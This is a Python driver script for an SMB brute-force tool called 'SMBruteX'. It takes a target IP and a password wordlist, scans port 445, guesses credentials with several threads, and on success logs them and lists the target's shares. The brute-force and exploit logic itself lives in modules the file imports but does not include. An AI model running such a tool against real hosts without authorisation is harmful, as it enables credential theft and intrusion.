from modules import scanner, brute, logger, exploit
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMBruteX - SMB Brute-force Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-w", "--wordlist", help="Path to password wordlist", default="wordlists/common.txt")
    parser.add_argument("-t", "--threads", help="Number of threads", type=int, default=5)
    args = parser.parse_args()

    print("[+] Scanning target...")
    if not scanner.port_open(args.target):
        print("[-] Port 445 not open.")
        exit()

    os_info, smb_version = scanner.detect_os_smb(args.target)
    print(f"[+] Detected OS: {os_info}, SMB Version: {smb_version}")

    creds = brute.run_brute_force(args.target, args.wordlist, args.threads)
    if creds:
        logger.log_success(args.target, creds)
        print("[+] Attempting auto-exploit...")
        exploit.auto_list_shares(args.target, creds)
    else:
        print("[-] No valid credentials found.")
